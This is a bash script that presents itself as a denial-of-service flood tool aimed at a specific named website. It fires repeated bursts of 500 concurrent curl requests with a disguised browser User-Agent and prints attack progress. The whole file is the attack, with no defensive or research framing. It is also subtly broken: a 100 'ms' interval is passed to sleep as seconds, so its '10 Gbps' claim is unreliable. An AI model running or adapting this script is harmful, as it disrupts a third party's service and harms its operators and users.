#!/bin/bash
# 10 Gbps DDoS Flood Script for https://www.nadiavpn.web.id/
# Using massive parallel connections

TARGET="https://www.nadiavpn.web.id/"
DURATION=30
INTERVAL=100

echo "============================================"
echo "  10 Gbps DDoS Flood Attack"
echo "  Target: $TARGET"
echo "  Duration: ${DURATION}s"
echo "  Interval: ${INTERVAL}ms"
echo "============================================"
echo "  Starting attack..."
echo "  Time: $(date)"
echo "============================================"

# Calculate how many burst groups we'll send
START_TIME=$(date +%s)
COUNT=0
TIMEOUTS=0
SUCCESS=0
ERRORS=0

# Send in large bursts
while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED=$((CURRENT_TIME - START_TIME))
    
    if [ $ELAPSED -ge $DURATION ]; then
        break
    fi
    
    # Spawn 500 concurrent connections per burst
    for i in $(seq 1 500); do
        curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total}\n" \
            --max-time 5 \
            --connect-timeout 5 \
            --compressed \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Encoding: gzip, deflate, br" \
            -H "Connection: keep-alive" \
            "$TARGET" &
    done
    
    COUNT=$((COUNT + 500))
    
    # Wait for interval
    sleep $INTERVAL
    
    if [ $((COUNT % 2500)) -eq 0 ]; then
        CURRENT=$(date +%s)
        ELAPSED=$((CURRENT - START_TIME))
        echo "  [${ELAPSED}s] Sent: $COUNT requests | Burst completed"
    fi
done

# Wait for all remaining background jobs
wait

END_TIME=$(date +%s)
TOTAL_TIME=$((END_TIME - START_TIME))

echo ""
echo "============================================"
echo "  ATTACK FINISHED"
echo "  Total Requests Sent: $COUNT"
echo "  Duration: ${TOTAL_TIME}s"
echo "  Rate: $((COUNT / TOTAL_TIME)) req/s"
echo "============================================"
